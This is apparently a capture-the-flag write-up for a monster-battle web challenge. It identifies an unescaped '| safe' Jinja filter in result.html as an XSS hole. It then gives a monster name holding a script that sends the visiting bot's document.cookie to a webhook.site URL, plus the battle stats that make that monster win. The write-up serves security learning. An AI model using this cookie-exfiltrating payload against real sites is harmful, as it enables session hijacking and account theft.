The vulnerability is the line 
```
<p>{{ reason | safe }}</p>
```
in `result.html`, allowing for XSS. The name of the monster that wins the battle is the controlled XSS input.

Using the following parameters:
monster1 name: <script>fetch('https://webhook.site/d1a08a3d-eb5d-407e-a22f-da873cc17c4d?cookie='+document.cookie)</script>
monster1 hp: 2
monster1 attack: 2
monster2 name: bbb
monster2 hp: 1
monster2 attack: 1

allows monster1 to win and allows their name to be used in the XSS. The resulting page is visited by the bot which exfiltrates the cookie to the webhook.